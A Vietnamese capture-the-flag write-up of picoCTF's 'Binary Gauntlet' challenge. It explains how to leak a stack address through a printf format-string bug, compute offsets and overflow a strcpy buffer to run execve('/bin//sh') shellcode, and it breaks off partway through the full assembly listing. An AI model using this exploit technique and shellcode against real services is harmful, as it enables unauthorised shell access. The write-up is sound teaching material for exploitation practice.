# Binary Gauntlet
**__ret2shellcode__**   

```
nc mercury.picoctf.net 37752
```
Hiện tại thì server của pico đã xóa bài này và update thành các bài khác nên mình không thể tìm lại link đề bài và submit được nữa. Mình nhớ đại khái là server chạy file chương trình gauntlet. Nhiệm vụ của chúng ta là tìm được flag được lưu trên server. [gauntlet](https://github.com/BuiKimPhat/ctf-writeup/blob/master/pwn/picoctf/Binary_Gauntlet_0/gauntlet)

## Việc đầu tiên cần làm là phân tích file thực thi  
  
- Xác định kiểu file thực thi
```
file gauntlet
```
__Lưu ý__: Nếu lúc gọi các lệnh liên quan đến file mà bị lỗi quyền hạn (no read permission, permission denied,...) thì ta phải cấp thêm quyền đọc / thực thi cho file:
```
chmod +rx gauntlet
```
- Sau khi xác định kiểu file bằng lệnh `file`, ta thấy:
```
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=a5c4ce8cddd5ece25b706af8d250134c3f70467c, not stripped
```
Dòng này có ý nghĩa: File gauntlet là file có định dạng ELF (file thực thi trên linux), sử dụng kiến trúc 64-bit, có thể chạy trên kiến trúc x86-64, bộ nhớ được liên kết động...


- Vì file có kiến trúc là 64-bit (x64), ta dùng IDA Pro 64-bit để disassemble file và xem code C mã giả để dễ tìm kiếm và phân tích lỗi      
Vì 1 chương trình luôn chạy hàm main trước nên ta sẽ phân tích hàm main trước       
    - Double-click vào hàm main trong cột bên trái để hiển thị code assembly trong text view.
    - Nhấn nút Tab trong cửa sổ text view để chuyển sang Pseudo-code view. Lúc này ta có thể đọc mã giả C của hàm main.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest; // [sp+10h] [bp-80h]@4
  __gid_t rgid; // [sp+7Ch] [bp-14h]@4
  FILE *stream; // [sp+80h] [bp-10h]@1
  char *s; // [sp+88h] [bp-8h]@1

  s = (char *)malloc(0x3E8uLL);
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(flag, 64, stream);
  signal(11, sigsegv_handler);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  fgets(s, 1000, stdin);
  s[999] = 0;
  printf(s, 1000LL, argv);
  fflush(stdout);
  fgets(s, 1000, stdin);
  s[999] = 0;
  strcpy(&dest, s);
  return 0;
}
```
## Bắt đầu phân tích chương trình và tìm lỗ hổng
**__Những thứ sau đây đều là ý kiến của riêng mình và chưa chắc sẽ đúng, có những thứ mình không biết hoặc không ảnh hưởng nhiều thì mình sẽ bỏ qua.__**            
Trong quá trình đọc code mã giả C, nếu có hàm nào mình không rõ nó làm gì hoặc các tham số của nó để làm gì, có thể dùng lệnh `man 3 <tên hàm>` để xem thông tin chi tiết.

### Phân tích mã giả bằng IDA Pro

Đọc sơ qua code một lượt, ta có thể dễ dàng nhận ra dòng thực thi của chương trình đại khái như sau:
- Cấp phát 0x3E8uLL (0x3E8 unsigned long long = 1000) bytes bộ nhớ động cho con trỏ char `s` (dùng để chứa chuỗi)
```
s = (char *)malloc(0x3E8uLL)
```
- Mở file flag để đọc, nếu không tìm thấy file thì in ra không tìm thấy file rồi thoát chương trình. Sau đó lưu nội dung vào biến `flag`:
```
stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(flag, 64, stream);
```
- Input từ bàn phím với max 1000 kí tự (bao gồm kí tự NULL `\x00` ở cuối cùng để kết thúc chuỗi nhập) rồi lưu vào `s`:
```
fgets(s, 1000, stdin);
s[999] = 0;
```
- In ra màn hình chuỗi `s` max 1000 kí tự:
```
printf(s, 1000LL, argv);
```
- Input từ bàn phím với max 1000 kí tự (bao gồm kí tự NULL `\x00` ở cuối cùng để kết thúc chuỗi nhập) rồi lưu vào `s`:
```
fgets(s, 1000, stdin);
s[999] = 0;
```
- Copy chuỗi `s` sang `dest`:
```
strcpy(&dest, s);
```
- Trả về giá trị 0, kết thúc hàm main:
```
return 0;
```

### Phân tích luồng thực thi assembly bằng GDB-peda

```
gdb gauntlet
```
Đầu tiên, ta nên kiểm tra chế độ bảo vệ của file thực thi bằng lệnh `checksec` để xem có cái nào chưa được bật để dễ khai thác hay không.
```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
Well, hầu hết tất cả mọi chế độ bảo vệ đều đã bị tắt => file có khá nhiều hướng để khai thác. Ở đây, mình sẽ nhắm vào khai thác NX. Nếu NX đã tắt, mình có thể thực thi chính __shellcode__ của mình trong chương trình.   

**__Shellcode__**: là 1 đoạn mã assembly được dịch sang chuỗi các kí tự ascii (in được, không in được), thường được dùng để thực thi 1 lệnh nào đó.     
Ví dụ như lệnh `execve` trong [Linux syscall](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) thường dùng để chạy lệnh `/bin/sh` để lấy shell của server và tự do tương tác với terminal của server, từ đó có thể `cat flag` để xem file flag.

Tiếp theo, ta sử dụng lệnh `pdis main` để xem các lệnh assembly được thực thi trong main.
```
   0x000000000040090d <+0>:     push   rbp
   0x000000000040090e <+1>:     mov    rbp,rsp
   0x0000000000400911 <+4>:     sub    rsp,0x90
   0x0000000000400918 <+11>:    mov    DWORD PTR [rbp-0x84],edi
   0x000000000040091e <+17>:    mov    QWORD PTR [rbp-0x90],rsi
   0x0000000000400925 <+24>:    mov    edi,0x3e8
   0x000000000040092a <+29>:    call   0x400790 <malloc@plt>
   0x000000000040092f <+34>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400933 <+38>:    lea    rsi,[rip+0x192]        # 0x400acc
   0x000000000040093a <+45>:    lea    rdi,[rip+0x18d]        # 0x400ace
   0x0000000000400941 <+52>:    call   0x4007c0 <fopen@plt>
   0x0000000000400946 <+57>:    mov    QWORD PTR [rbp-0x10],rax
   0x000000000040094a <+61>:    cmp    QWORD PTR [rbp-0x10],0x0
   0x000000000040094f <+66>:    jne    0x400967 <main+90>
   0x0000000000400951 <+68>:    lea    rdi,[rip+0x180]        # 0x400ad8
   0x0000000000400958 <+75>:    call   0x400730 <puts@plt>
   0x000000000040095d <+80>:    mov    edi,0x0
   0x0000000000400962 <+85>:    call   0x4007d0 <exit@plt>
   0x0000000000400967 <+90>:    mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040096b <+94>:    mov    rdx,rax
   0x000000000040096e <+97>:    mov    esi,0x40
   0x0000000000400973 <+102>:   lea    rdi,[rip+0x200766]        # 0x6010e0 <flag>
   0x000000000040097a <+109>:   call   0x400760 <fgets@plt>
   0x000000000040097f <+114>:   lea    rsi,[rip+0xffffffffffffff41]        # 0x4008c7 <sigsegv_handler>
   0x0000000000400986 <+121>:   mov    edi,0xb
   0x000000000040098b <+126>:   call   0x400770 <signal@plt>
   0x0000000000400990 <+131>:   mov    eax,0x0
   0x0000000000400995 <+136>:   call   0x4007b0 <getegid@plt>
   0x000000000040099a <+141>:   mov    DWORD PTR [rbp-0x14],eax
   0x000000000040099d <+144>:   mov    edx,DWORD PTR [rbp-0x14]
   0x00000000004009a0 <+147>:   mov    ecx,DWORD PTR [rbp-0x14]
   0x00000000004009a3 <+150>:   mov    eax,DWORD PTR [rbp-0x14]
   0x00000000004009a6 <+153>:   mov    esi,ecx
   0x00000000004009a8 <+155>:   mov    edi,eax
   0x00000000004009aa <+157>:   mov    eax,0x0
   0x00000000004009af <+162>:   call   0x400740 <setresgid@plt>
   0x00000000004009b4 <+167>:   mov    rdx,QWORD PTR [rip+0x2006f5]        # 0x6010b0 <stdin@@GLIBC_2.2.5>
   0x00000000004009bb <+174>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009bf <+178>:   mov    esi,0x3e8
   0x00000000004009c4 <+183>:   mov    rdi,rax
   0x00000000004009c7 <+186>:   call   0x400760 <fgets@plt>
   0x00000000004009cc <+191>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009d0 <+195>:   add    rax,0x3e7
   0x00000000004009d6 <+201>:   mov    BYTE PTR [rax],0x0
   0x00000000004009d9 <+204>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009dd <+208>:   mov    rdi,rax
   0x00000000004009e0 <+211>:   mov    eax,0x0
   0x00000000004009e5 <+216>:   call   0x400750 <printf@plt>
   0x00000000004009ea <+221>:   mov    rax,QWORD PTR [rip+0x2006af]        # 0x6010a0 <stdout@@GLIBC_2.2.5>
   0x00000000004009f1 <+228>:   mov    rdi,rax
   0x00000000004009f4 <+231>:   call   0x4007a0 <fflush@plt>
   0x00000000004009f9 <+236>:   mov    rdx,QWORD PTR [rip+0x2006b0]        # 0x6010b0 <stdin@@GLIBC_2.2.5>
   0x0000000000400a00 <+243>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400a04 <+247>:   mov    esi,0x3e8
   0x0000000000400a09 <+252>:   mov    rdi,rax
   0x0000000000400a0c <+255>:   call   0x400760 <fgets@plt>
   0x0000000000400a11 <+260>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400a15 <+264>:   add    rax,0x3e7
   0x0000000000400a1b <+270>:   mov    BYTE PTR [rax],0x0
   0x0000000000400a1e <+273>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400a22 <+277>:   lea    rax,[rbp-0x80]
   0x0000000000400a26 <+281>:   mov    rsi,rdx
   0x0000000000400a29 <+284>:   mov    rdi,rax
   0x0000000000400a2c <+287>:   call   0x400720 <strcpy@plt>
   0x0000000000400a31 <+292>:   mov    eax,0x0
   0x0000000000400a36 <+297>:   leave
   0x0000000000400a37 <+298>:   ret
```
Vì đây là địa chỉ ảo nên có thể mỗi máy lúc thực thi sẽ mỗi khác, ta chỉ nên xem xét lệnh.      
Với GDB-peda, những hàm nguy hiểm có thể được sử dụng để khai thác trong những bài dễ sẽ được bôi màu đỏ. Trong này có 3 hàm:
- fgets
- printf
- strcpy
Trở về với vấn đề chính, khai thác lỗ hổng chương trình NX bằng shellcode. Vậy làm thế nào để có thể thực thi được shellcode và chiếm lấy shell của server? Câu trả lời là sử dụng kĩ thuật ret2shellcode trong ROP (Return Oriented Programming).      

Sơ lược về kĩ thuật ret2shellcode:
- Tìm return address của chương trình
- Viết shellcode
- Ghi shellcode vào 1 vùng nhớ nào đó trong chương trình
- Ghi đè địa chỉ vùng nhớ shellcode vào return address bằng 1 cách nào đó       
Khi chương trình thực thi đến lệnh return (ret) thì sẽ chạy shellcode trong vùng nhớ mà return address đang trỏ đến.

**__Return address__**: địa chỉ lệnh được chứa ở đỉnh stack, được nạp vào ngay trước khi lệnh `ret` được thực thi.      
Cụ thể như sau:     
- Thử dùng `b* 0x0000000000400a37` đặt breakpoint tại địa chỉ lệnh 0x0000000000400a37 chứa lệnh `ret`.
- `run` và nhập bất kì cho đến khi chạy đến breakpoint ở lệnh `ret`.
- Lúc này, return address được thể hiện ở 2 vị trí: đỉnh stack và thanh ghi RSP (Stack Pointer). Tại địa chỉ **0x7ffffffee4d8** trong vùng nhớ stack có chứa địa chỉ lệnh **0x7fffff021b97** (return address).      
Giả sử ta `next` để xem lệnh `ret` đã thực hiện như thế nào, ta có thể thấy lúc này thanh ghi RIP (Instruction Pointer) đã trỏ đến địa chỉ lệnh return address. Có nghĩa là chương trình đã nhảy đến return address để chạy tiếp các lệnh assembly từ địa chỉ đó trở đi.        
Nhờ cơ chế này của `ret`, chỉ cần chúng ta đổi return address (0x7fffff021b97) sang 1 địa chỉ khác chứa shellcode của mình thì nó sẽ thực thi được shellcode của mình khi chạy lệnh `ret`.    

Vì khi thực thi chương trình trên 1 máy tính khác thì địa chỉ stack sẽ thay đổi => địa chỉ của stack chứa return address cũng thay đổi. Vì vậy, ta phải tìm cách xem địa chỉ stack chứa return address (__s_ret_addr__) lúc chương trình được thực thi trên remote server thì mới ghi đè được return address.

Trở về với việc phân tích luồng thực thi của chương trình dưới góc nhìn trong GDB-peda:
- Khi chương trình cấp phát bộ nhớ động cho `s`, 1 vùng nhớ **heap** được tạo ra dùng để chứa dữ liệu của `s`. Vùng nhớ này có thể lớn hơn số lượng bytes mà ban đầu người dùng đã cấp phát, để chứa thêm 1 số thông tin liên quan và để sau này có cấp phát thêm gì thì sẽ thêm luôn vào heap chứ không cần tạo lại. (có thể kiểm tra bằng `vmmap`)
- Trong quá trình thực thi, người dùng chỉ tương tác với chương trình được 3 lần: Nhập bằng `fgets`, Xuất bằng `printf`, Nhập bằng `fgets`.   
Hàm `fgets` nhận chuỗi max 1000 kí tự từ bàn phím rồi lưu ở biến `s`.     
Hàm `printf` in chuỗi s max 1000 kí tự ra màn hình.   
Sau khi tìm hiểu, mình nhận ra hàm `printf` ở đây đã bị lỗi **__format string__**.

**__Lỗi Format string__**: bắt nguồn từ hàm `printf` có thể nhận rất nhiều tham số. Trong đó tham số đầu tiên luôn là 1 chuỗi format string. Nếu muốn in trực tiếp chuỗi ra màn hình thì chúng ta chỉ cần gõ các kí tự muốn in vào chuỗi format string và nó sẽ tự in. Tuy nhiên, lí do chuỗi đó được gọi là format string vì chuỗi có thể được dùng để khai báo định dạng của các tham số theo sau và truyền các tham số theo sau vào chuỗi đó để in ra màn hình. Ví dụ:
```
printf("abcd"); // abcd
printf("Tong = %d, tich = %.1f",16,32); // Tong sum = 16, tich = 32.0
```
Vậy chuyện gì sẽ xảy ra nếu chúng ta thực hiện khai báo định dạng trong format string nhưng lại không truyền thêm tham số ở đằng sau?
```
printf("a1 = %x, a2 = %x, a3 = %x, a4 = %x") // a1 = ????????, a2 = ????????, a3 = ????????, a4 = ????????
```
Hãy thử đặt breakpoint tại hàm `printf` rồi `run` đến chỗ breakpoint với input là 1 chuỗi bất kì:
```
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0xa61616161616161 ('aaaaaaa\n')
RDX: 0x7fffff3ed8d0 --> 0x0
RSI: 0x602260 ('a' <repeats 13 times>, "\n")
RDI: 0x602260 ('a' <repeats 13 times>, "\n")
RBP: 0x7ffffffeddd0 --> 0x400a40 --> 0x41d7894956415741
RSP: 0x7ffffffedd40 --> 0x7ffffffedeb8 --> 0x7ffffffee0ef ("/mnt/f/ctf/pwn/picoctf/Binary_Gauntlet_0/gauntlet")
RIP: 0x4009e5 --> 0x58b48fffffd66e8
R8 : 0x60389e --> 0x0
R9 : 0x7fffff7e14c0
R10: 0x602010 --> 0x0
R11: 0x602010 --> 0x0
R12: 0x4007e0 --> 0x89485ed18949ed31
R13: 0x7ffffffedeb0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009d9 <main+204>: mov    rax,QWORD PTR [rbp-0x8]
   0x4009dd <main+208>: mov    rdi,rax
   0x4009e0 <main+211>: mov    eax,0x0
=> 0x4009e5 <main+216>: call   0x400750 <printf@plt>
   0x4009ea <main+221>: mov    rax,QWORD PTR [rip+0x2006af]        # 0x6010a0 <stdout@@GLIBC_2.2.5>
   0x4009f1 <main+228>: mov    rdi,rax
   0x4009f4 <main+231>: call   0x4007a0 <fflush@plt>
   0x4009f9 <main+236>: mov    rdx,QWORD PTR [rip+0x2006b0]        # 0x6010b0 <stdin@@GLIBC_2.2.5>
Guessed arguments:
arg[0]: 0x602260 ('a' <repeats 13 times>, "\n")
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffedd40 --> 0x7ffffffedeb8 --> 0x7ffffffee0ef ("/mnt/f/ctf/pwn/picoctf/Binary_Gauntlet_0/gauntlet")
0008| 0x7ffffffedd48 --> 0x1ff629710
0016| 0x7ffffffedd50 --> 0x0
0024| 0x7ffffffedd58 --> 0x0
0032| 0x7ffffffedd60 --> 0x0
0040| 0x7ffffffedd68 --> 0x756e6547 ('Genu')
0048| 0x7ffffffedd70 --> 0x9 ('\t')
0056| 0x7ffffffedd78 --> 0x7fffff402660
[------------------------------------------------------------------------------]
```
Mình để ý thấy ở dưới cùng của phần **code** có thêm phần **Guessed arguments** hiển thị ra tất cả các tham số mà hàm nhận vào và địa chỉ chứa tham số đó. Ta thấy hàm `printf` đã nhận 1 tham số. Tham số đầu tiên chắc chắn là format string, là chuỗi `s` mà mình nhập vào từ bàn phím. Hãy thử `run` lại đến lúc input, khai báo định dạng hexa (`%x` hoặc `%p`) 6 lần trong chuỗi `s` mình nhập vào và xem xét các thanh ghi ngay trước khi gọi hàm `printf`.    
```
%p %p %p %p %p %p
```
```
RAX: 0x0
RBX: 0x0
RCX: 0x11
RDX: 0x7fffff3ed8d0 --> 0x0
RSI: 0x602260 ("%p %p %p %p %p %p\n")
RDI: 0x602260 ("%p %p %p %p %p %p\n")
RBP: 0x7ffffffeddd0 --> 0x400a40 --> 0x41d7894956415741
RSP: 0x7ffffffedd40 --> 0x7ffffffedeb8 --> 0x7ffffffee0ef ("/mnt/f/ctf/pwn/picoctf/Binary_Gauntlet_0/gauntlet")
RIP: 0x4009e5 --> 0x58b48fffffd66e8
R8 : 0x6038a2 --> 0x0
R9 : 0x7fffff7e14c0
R10: 0x602010 --> 0x0
R11: 0x602010 --> 0x0
R12: 0x4007e0 --> 0x89485ed18949ed31
R13: 0x7ffffffedeb0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
```
Dễ dàng thấy, format string của chúng ta được lưu vào địa chỉ 0x602260 trong vùng nhớ heap (kiểm tra bằng `vmmap`) và được nạp vào thanh ghi RSI như tham số thứ 1 để chuẩn bị gọi hàm `printf`. Câu hỏi là tham số thứ 2, thứ 3, thứ 4,... được nạp vào đâu? Hãy `next` để biết câu trả lời.     
Chương trình in ra:
```
0x602260 0x7fffff3ed8d0 0x11 0x6038a2 0x7fffff7e14c0 0x7ffffffedeb8
```
6 kết quả được in ra màn hình, đại diện lần lượt cho địa chỉ của 6 tham số trong printf.    
- Tham số 1 (format string) có giá trị là địa chỉ `s` trên vùng nhớ heap 0x602260 được nạp vào thanh ghi RSI.    
- Tham số 2 có giá trị 0x7fffff3ed8d0 được nạp vào thanh ghi RDX (đối chiếu với bảng thanh ghi ở trên).    
- Tham số 3 có giá trị 0x11 được nạp vào thanh ghi RCX.
- Tham số 4 có giá trị 0x6038a2 được nạp vào thành ghi R8.
- Tham số 5 nạp vào R9...     
Như vậy thứ tự lấy tham số của hàm `printf` từ thanh ghi là RSI, RDX, RCX, R8, R9,...       
Nhờ format string, ta có thể in ra giá trị của các thanh ghi chứa tham số.

Okay, vậy bây giờ làm thế nào để bỏ shellcode vào chương trình để nó có thể thực thi? Ta có thể nhập shellcode vào qua việc `fgets` chuỗi `s`, chuỗi `s` được lưu trong heap nên shellcode cũng sẽ được lưu trong heap. Thế là ta đã có địa chỉ của shellcode để ghi đè vào return address, đó cũng chính là địa chỉ của chuỗi `s` 0x602260 trên vùng nhớ heap (địa chỉ này không đổi).   

Bây giờ việc cần làm là phải ghi đè địa chỉ chứa shellcode vào return address. Như ta đã biết, return address nằm trên stack, và 1 số biến sau khi khai báo cũng sẽ có địa chỉ bộ nhớ trong stack, trong đó có biến `dest` (đích của lệnh `strcpy`, xem trong mã giả trên IDA).   

Đến đây, mình đã suy nghĩ đến việc ghi tràn bộ đệm 1 chuỗi bất kì với độ dài chuỗi từ địa chỉ chứa biến bất kì trong stack đến khi gặp địa chỉ stack của return address rồi mới ghi địa chỉ chứa shellcode vào để thay thế return address. Ở đây mình chỉ có thể tương tác được với biến `dest` trong stack thôi, nhờ vào hàm `strcpy`. 

Lỗ hổng của hàm `strcpy` xuất hiện khi nó copy toàn bộ chuỗi từ buffer nguồn đến buffer đích (kể cả kí tự NULL \x00), nhưng bộ nhớ cấp phát ở buffer đích không đủ để chứa chuỗi thì nó sẽ tràn các kí tự chuỗi còn lại xuống các stack bên dưới, phục vụ cho việc ghi đè return address mình đã đề cập ở trên. Như vậy, sau khi chúng ta nhập chuỗi `s` (heap) ở lần 2, nó sẽ được copy sang biến `dest` (stack) => chúng ta phải nhập chuỗi **__shellcode__ + __1 đống kí tự để tràn stack đến địa chỉ của return address__ + __địa chỉ vùng nhớ chứa shellcode__** vào từ lần nhập thứ 2.    
- Shellcode: mình sẽ viết ở phần sau.
- Đống kí tự chèn vào để đến được địa chỉ return address: `"a"*(offset giữa địa chỉ dest và địa chỉ return address - độ dài chuỗi shellcode)`
- Địa chỉ vùng nhớ chứa shellcode: sau khi `strcpy`, có đến 2 vùng nhớ chứa shellcode:
  - Trong heap: địa chỉ của `s` __0x602260__
  - Trong stack: địa chỉ của `dest`. Vì stack có địa chỉ thay đổi, nhưng khoảng cách (offset) giữa stack chứa biến `dest` và return address không đổi nên địa chỉ của `dest` được tính như sau:
  ```
  dest_addr = s_ret_addr - offset giữa s_ret_addr và dest_addr
  ```
Vấn đề xuất hiện, s_ret_addr chưa biết (địa chỉ stack trên remote server thay đổi) và làm thể nào để tính offset giữa s_ret_addr và dest_addr (offset_dest_ret)? 
- Về __s_ret_addr__, mình có thể lợi dụng tính chất offset giữa 2 stack là không đổi trong mọi lần thực thi và tính được offset giữa địa chỉ return address và 1 địa chỉ stack nào đó. Từ đó tính ra `return address = địa chỉ stack nào đó +/- offset`. Thế cái "địa chỉ stack nào đó" mình lấy ở đâu? Câu trả lời nằm ở lỗi format string trong hàm `printf`. Ở lần input đầu tiên, mình sẽ in liên tục %p để lấy các địa chỉ được nạp trong thanh ghi cho đến khi tìm thấy 1 địa chỉ nào đó nằm trong vùng nhớ stack.    
In đến tham số thứ 6, có 1 địa chỉ nằm trong vùng nhớ stack 0x7ffffffedeb8. Mình có thể dùng địa chỉ này để tính offset đến địa chỉ return address lúc debug trên máy, từ đó có thể tính ra địa chỉ return address lúc thực thi trên remote.    
```
offset2 = 0x7ffffffedeb8(random stack) - 0x7ffffffeddd8(ret) = 224    
# Tinh offset giua 1 stack bat ki va dia chi stack chua return address    
s_ret_addr = random_stack_addr - offset2 = random_stack_addr - 224    
# Tinh dia chi cua return address tren stack
```
- Về __offset_dest_ret__, cách tính đơn giản hơn nhiều. Vì offset là không đổi nên mình chỉ cần tính offset giữa biến `dest` và địa chỉ return address trong stack trên GDB-peda là được.     
Muốn xem địa chỉ của `dest`, ta đặt breakpoint tại hàm `strcpy` có tham số đầu tiên là `dest` rồi chạy chương trình đến breakpoint xem sao.   
```
[-------------------------------------code-------------------------------------]
   0x400a22 <main+277>: lea    rax,[rbp-0x80]
   0x400a26 <main+281>: mov    rsi,rdx
   0x400a29 <main+284>: mov    rdi,rax
=> 0x400a2c <main+287>: call   0x400720 <strcpy@plt>
   0x400a31 <main+292>: mov    eax,0x0
   0x400a36 <main+297>: leave
   0x400a37 <main+298>: ret
   0x400a38:    nop    DWORD PTR [rax+rax*1+0x0]
Guessed arguments:
arg[0]: 0x7ffffffedd50 --> 0x0
arg[1]: 0x602260 ("aaaaaaa\n")
arg[2]: 0x602260 ("aaaaaaa\n")
```
Ở đây **Guessed arguments** hiển thị rằng hàm nhận đến 3 tham số nhưng nó chỉ nhận có 2 thôi (1 địa chỉ buffer đích, 1 địa chỉ buffer nguồn), mình không biết tham số thứ 3 ở đâu ra mà lại trùng với tham số thứ 2 :v  Vậy tham số thứ 1 0x7ffffffedd50 là địa chỉ buffer đích cũng tương đương với địa chỉ của `dest`. Thế là ta đã biết địa chỉ của `dest`. Việc còn lại chỉ cần tính offset giữa `dest` và return address nữa thôi :v    
```
offset_dest_ret = 0x7ffffffeddd8(ret) - 0x7ffffffedd50(dest) = 136
```
Từ đó có thể tính được `dest_addr`    
```
dest_addr = s_ret_addr - offset_dest_ret = s_ret_addr - 136
```

Qua các phân tích trên, để lấy được các yếu tố cần thiết cho việc khai thác lỗ hổng, mình đã lập ra kịch bản khai thác như sau:   
- Ở lần nhập đầu tiên, mình sẽ nhập vào **__%6$p__** để lấy địa chỉ hex tại tham số thứ 6 của hàm `printf` (1 địa chỉ nào đó trên stack dùng để tính địa chỉ return address).
- Ở lần nhập tiếp theo, mình sẽ nhập chuỗi **__shellcode__ + __"a"*(offset giữa địa chỉ dest và địa chỉ return address - độ dài chuỗi shellcode)__ + __địa chỉ vùng nhớ chứa shellcode (heap hoặc stack)__**

Đã có kịch bản khai thác, giờ viết shellcode để lấy shell thôi :P   

## Khai thác lỗ hổng

### Viết shellcode để khai thác lỗ hổng

Sử dụng tài liệu [Linux syscall](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) để tra cứu các lệnh của hệ thống. Ở đây mình sẽ sử dụng hàm **sys_execve** (thứ 59 trong bảng) để thực thi file lấy shell `/bin/sh` trên hệ thống chạy chương trình luôn.

Trong bảng, để thực hiện được hàm **sys_execve** thì phải nạp giá trị 59 (0x3b) vào thanh ghi RAX. Các tham số của hàm được nạp lần lượt vào RDI, RSI, RDX... nhưng ở đây chúng ta chỉ cần nạp tham số thứ 1 (lệnh cần thực thi) vào RDI, các tham số khác ta sẽ nạp 0x0 vào vì nó optional và mình chưa cần sử dụng nó.    

__Lưu ý__ : Trong quá trình viết shellcode và payload input lần 2, mình cần phải chú ý không được để lọt kí tự \x00 (kí tự NULL dùng để đánh dấu kết thúc chuỗi) vào giữa chuỗi mình input vào.    
Khi hàm `strcpy` copy từ `s` sang `dest`, làm thế nào nó có thể xác định được copy đến đâu là kết thúc chuỗi?   
Câu trả lời là hàm sẽ copy từ đầu đến kí tự \x00 đầu tiên trong chuỗi (copy luôn cả kí tự \x00 vào), rồi sẽ kết thúc việc copy chuỗi.   
Vì hàm hoạt động như vậy nên nếu giữa chừng mà gặp kí tự \x00 thì các kí tự theo sau nó sẽ bị bỏ đi => dẫn đến việc shellcode không hoạt động như mong muốn.    

Tiến hành [viết code assembly và chuyển sang shellcode](https://defuse.ca/online-x86-assembler.htm):

- Đầu tiên, ta phải nạp chuỗi filename `/bin/sh` vào thanh ghi RDI.    

Khi nạp 1 chuỗi giá trị vào 1 địa chỉ bộ nhớ (kiến trúc x64), từng kí tự từ trái sang phải trong chuỗi được chuyển sang dạng hex 1 byte và được ghép từ phải sang trái, tạo nên giá trị hex 8 bytes mới tương đương 8 kí tự đầu chuỗi. 8 bytes địa chỉ tiếp theo cũng tương tự nếu chuỗi dài hơn 8 kí tự...   
Ví dụ:
```
# Đã nạp chuỗi "123456789\n" vào địa chỉ 0x602260 ("\n" là khi nhấn Enter nhập chuỗi nó thêm vào)

x/3x 0x602260
# Xem giá trị tại địa chỉ 0x602260 trong GDB-peda

# Kết quả
0x602260:       0x34333231      0x38373635      0x00000a39   # 0x0a393837363534333231

# Cụ thể hơn
0x602260: 0x31  # "1"
0x602261: 0x32  # "2"
0x602262: 0x33  # "3"
0x602263: 0x34  # "4"
0x602264: 0x35  # "5"
0x602265: 0x36  # "6"
0x602266: 0x37  # "7"
0x602267: 0x38  # "8"
0x602268: 0x39  # "9"
0x602269: 0x0a  # "/n"
```
Như vậy, chuỗi `/bin/sh` được chuyển thành giá trị hex 0x68732f6e69622f. Nhưng giá trị này chỉ có 7 bytes, khi viết shellcode trên kiến trúc x64, giá trị sẽ tự động được thêm vào phía trước 1 bytes 0x00 để đủ 8 bytes (0x0068732f6e69622f). Nếu chuyển mã hex này sang chuỗi shellcode thì sẽ chứa kí tự \x00 ở cuối cùng (vi phạm lưu ý mình đã đề cập ở trên!).    
Việc cần làm bây giờ là thay thế chuỗi 7 bytes này thành 1 chuỗi 8 bytes có tác dụng tương tự. Theo mình được biết thì trong chuỗi filename `/bin/sh` dù có chứa 1 hay nhiều dấu "/" cũng sẽ mang ý nghĩa như nhau, hệ thống vẫn chạy được bình thường.   
Vậy thay vì dùng `/bin/sh` thì phải dùng `/bin//sh`.      

__Lưu ý nhẹ__: chuỗi trong python có hàm `encode("hex")` dùng để chuyển 1 chuỗi sang giá trị hex nhưng với thứ tự giống với thứ tự các kí tự trong chuỗi => máy tính có thể đọc ngược chuỗi. Vì vậy, nếu muốn dùng `encode("hex")` để chuyển đổi cho nhanh thì ta nên đảo ngược chuỗi trước rồi mới encode sau.
```
"/bin//sh"[::-1].encode("hex")
# Đảo ngược chuỗi rồi encode sang giá trị hex

# Kết quả
68732f2f6e69622f
```

Vậy ta sẽ nạp giá trị 0x68732f2f6e69622f vào thanh ghi RDI để có thể thực thi `/bin/sh`.    
Bằng cách reset thanh ghi RAX = 0x0, rồi push RAX vào stack (push giá trị 0x0 = kí tự NULL đánh dấu kết thúc chuỗi vào stack để đánh dấu kết thúc chuỗi `/bin//sh`), sau đó mới nạp giá trị 0x68732f2f6e69622f vào RAX rồi push vào stack. Lúc cần lấy giá trị chuỗi ra thì ta chỉ việc nạp từ thanh ghi RSP (đỉnh stack).    
```
xor rax, rax
push rax
mov rax, 0x68732f2f6e69622f
push rax
mov rdi, rsp
```

- Reset các thanh ghi cần thiết khác để thiết lập tham số đúng cho hàm `sys_execve`:
```
xor rsi, rsi
xor rdx, rdx
```

- Nạp giá trị 0x3b vào RAX để `syscall` trỏ đến hàm `sys_execve` dùng để thực thi `/bin/sh`:   
Bằng cách reset giá trị RAX về 0x0 rồi xor với 0x3b để RAX nhận giá trị 0x3b.   
Lí do mình làm như vậy chứ không trực tiếp dùng `mov rax, 0x3b` là vì sau khi chuyển sang shellcode sẽ có kí tự lẫn kí tự \x00 vào (vi phạm lưu ý mình đã đề cập trước đó). Có thể sử dụng nhiều cách khác để nạp giá trị 0x3b vào RAX, miễn là không lẫn kí tự \x00 vào là được.   
```
xor rax, rax
xor rax, 0x3b
```

- Thực hiện gọi syscall
```
syscall
```

__Code đầy đủ assembly__:
```
xor rax, rax
push rax
mov rax, 0x68732f2f6e69622f
